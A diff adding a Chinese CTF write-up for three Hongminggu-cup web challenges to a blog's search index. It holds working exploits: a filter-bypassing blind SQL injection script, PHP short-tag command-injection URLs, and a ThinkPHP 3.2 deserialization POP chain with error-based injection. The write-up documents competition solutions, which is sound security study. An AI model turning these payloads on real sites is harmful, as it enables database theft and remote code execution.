@@ -10162,4 +10162,192 @@ ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></p
         <tag>Web安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>红明谷杯部分WEB write up</title>
+    <url>//articles/hongmingguctf.html</url>
+    <content><![CDATA[<h1 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h1><ul>
+<li><p>简单fuzz发现过滤了<code>if,空格、or,and,information,单引号,benchmark,sleep，=，li k,+,-</code>等关键字</p>
+</li>
+<li><p>但是双引号并未过滤。正好题目也是由双引号包裹的字符串，同时<code>#</code>也没有过滤可以顺利逃逸出来</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-194839@2x.png" alt="WX20210402-194839@2x"></p>
+<p>or和and 等逻辑运算符直接用<code>||</code>代替即可。等于号可以使用<code>regexp</code>或者<code>strcmp</code>,而字符串分割可以使用<code>locate</code>代替。<code>||</code>只要一边执行成功就能跳转到<code>home.php</code></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-195828@2x.png" alt="WX20210402-195828@2x"></p>
+</li>
+<li><p>使用基于运行错误的BOOL盲注(<a href="http://www.plasf.cn/articles/spatial_functions_blind_inject.html)，例如exp(710)即可溢出报错">http://www.plasf.cn/articles/spatial_functions_blind_inject.html)，例如exp(710)即可溢出报错</a></p>
+</li>
+</ul>
+<img src="https://goodcheerleung.gitee.io/macpic/WX20210402-195930@2x.png" alt="WX20210402-195930@2x" style="zoom:50%;">
+
+<ul>
+<li>​    if使用<code>make_set</code>即可可以构造如下payload：</li>
+</ul>
+<pre><code>username=a&quot;||exp(make_set((database()/**/regexp/**/binary/**/0x637466),0x373130,0x31))#&amp;password=</code></pre><ul>
+<li>如果猜测正确exp溢出导致SQL执行失败，返回<code>Username or password error!</code></li>
+</ul>
+<img src="https://goodcheerleung.gitee.io/macpic/WX20210402-200946@2x.png" alt="WX20210402-200946@2x" style="zoom: 33%;">
+
+<ul>
+<li>猜测错误那么返回1，exp不溢出运行正常。</li>
+</ul>
+<img src="https://goodcheerleung.gitee.io/macpic/WX20210402-201021@2x.png" alt="WX20210402-201021@2x" style="zoom:33%;">
+
+<ul>
+<li>由于information被过滤使用<code>mysql.innodb_index_stats</code>代替发现可以,前面可以猜出数据库是ctf,直接猜表名</li>
+</ul>
+<pre><code class="python">  payload = {
+  &#39;username&#39;:&#39;a&quot;||exp(make_set(strcmp((locate(binary/**/%s,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/binary/**/0x637466),%s)),%s),710,1))#&#39;%(ord2hex(j),i,i),
+  &#39;password&#39;:&#39;&#39;
+  }</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-201424@2x.png" alt="WX20210402-201424@2x"></p>
+<ul>
+<li>猜出表名f1ag，但是innodb的方法无法猜出列名，但是可以简单测试出列名的个数为两个。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-201712@2x.png" alt="WX20210402-201712@2x"></p>
+<ul>
+<li>直接使用无列名注入即可综合上面分析最终EXP为：</li>
+</ul>
+<pre><code class="python">#/**/coding=utf-8
+import io
+import requests
+import threading
+def ord2hex(string):
+    result = &quot;&quot;
+    for i in string:
+        r = hex(ord(i));
+        r = r.replace(&#39;0x&#39;,&#39;&#39;)
+        result = result+r
+    return &#39;0x&#39;+result
+
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{,_&#39;
+flag = &#39;&#39;
+sessid = &#39;flag&#39;
+for i in range(1,70):
+    for j in tables:
+        url = &quot;http://eci-2ze2jur5bqu7g7b1eaws.cloudeci1.ichunqiu.com/login.php&quot;
+        payload = {
+        &#39;username&#39;:&#39;a&quot;||exp(make_set(strcmp((locate(binary/**/%s,(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#&#39;%(ord2hex(j),i,i),
+        &#39;password&#39;:&#39;&#39;
+        }
+        resp = requests.post(url,data=payload)
+        #print(payload[&#39;username&#39;])
+        if &#39;home.php&#39; in resp.text:
+            flag = flag +j
+            print(flag)
+            break</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-202003@2x.png" alt="WX20210402-202003@2x"></p>
+<h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><ul>
+<li>简单题</li>
+<li>用短标签绕过对php的过滤，<code>$IFS$9</code>代替空格。</li>
+</ul>
+<pre><code>?action=upload&amp;data=&lt;?=`ls\$IFS\$9/`?&gt;</code></pre><ul>
+<li>直接得到文件列表</li>
+</ul>
+<pre><code>!whatyouwantggggggg401.php
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var</code></pre><ul>
+<li>直接用通配符读就好了</li>
+</ul>
+<pre><code>?action=upload&amp;data=&lt;?=`cat\$IFS\$9/*.ph*`?&gt;</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-202932@2x.png" alt="WX20210402-202932@2x"></p>
+<h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><ul>
+<li>扫出源码：<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></li>
+<li>Thinkphp3.2,home控制器存在一个反序列化方法</li>
+</ul>
+<img src="https://goodcheerleung.gitee.io/macpic/WX20210402-203826@2x.png" alt="WX20210402-203826@2x" style="zoom:25%;">
+
+<ul>
+<li><p>网上找到一个POP链发现可以用<a href="https://www.jianshu.com/p/41782991b4b2" target="_blank" rel="noopener">https://www.jianshu.com/p/41782991b4b2</a></p>
+</li>
+<li><p>报错注入读到存在一个叫tp的数据库，里面有个叫f14g的表（以为用MYSQL导出日志GETSHELL整了半天在数据库里面）</p>
+</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210402-203648@2x.png" alt="WX20210402-203648@2x"></p>
+<ul>
+<li>Exp</li>
+</ul>
+<pre><code class="php">&lt;?php
+namespace Think\Db\Driver{
+    use PDO;
+    class Mysql{
+        protected $options = array(
+            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件
+        );
+        protected $config = array(
+            &quot;debug&quot;    =&gt; 1,
+            &quot;database&quot; =&gt; &quot;mysql&quot;,
+            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,
+            &quot;hostport&quot; =&gt; &quot;3306&quot;,
+            &quot;charset&quot;  =&gt; &quot;utf8&quot;,
+            &quot;username&quot; =&gt; &quot;root&quot;,
+            &quot;password&quot; =&gt; &quot;123456&quot;
+        );
+    }
+}
+
+namespace Think\Image\Driver{
+    use Think\Session\Driver\Memcache;
+    class Imagick{
+        private $img;
+
+        public function __construct(){
+            $this-&gt;img = new Memcache();
+        }
+    }
+}
+
+namespace Think\Session\Driver{
+    use Think\Model;
+    class Memcache{
+        protected $handle;
+
+        public function __construct(){
+            $this-&gt;handle = new Model();
+        }
+    }
+}
+
+namespace Think{
+    use Think\Db\Driver\Mysql;
+    class Model{
+        protected $options   = array();
+        protected $pk;
+        protected $data = array();
+        protected $db = null;
+
+        public function __construct(){
+            $this-&gt;db = new Mysql();
+            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
+            $this-&gt;pk = &#39;id&#39;;
+            $this-&gt;data[$this-&gt;pk] = array(
+                &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,concat(mid((select f14g from tp.f14g),20,70),0x7e),1);#&quot;,
+                &quot;where&quot; =&gt; &quot;1=1&quot;
+            );
+        }
+    }
+}
+
+namespace {
+    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
+}</code></pre>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
